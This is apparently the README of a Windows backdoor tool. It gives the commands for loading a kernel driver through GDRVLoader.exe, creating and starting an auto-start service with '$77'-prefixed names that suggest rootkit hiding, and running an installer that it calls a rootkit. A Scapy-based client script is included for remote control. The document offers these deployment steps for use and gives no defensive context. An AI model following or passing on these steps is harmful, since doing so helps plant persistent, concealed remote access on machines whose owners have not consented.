# WinDivert-Backdoor
## Server
1. Install driver with GDRVLoader.exe </br>
`GDRVLoader.exe $77kernel.sys` 
3. Install service </br>
`sc create $77service binPath= "C:\$77folder\$77service.exe" start= auto`
5. Start service </br>
`sc start $77service`
6. Install rootkit </br>
`Install.exe`
## Client
1. [Install Scapy](https://scapy.readthedocs.io/en/latest/installation.html)
2. Download client.py script
3. Flourish

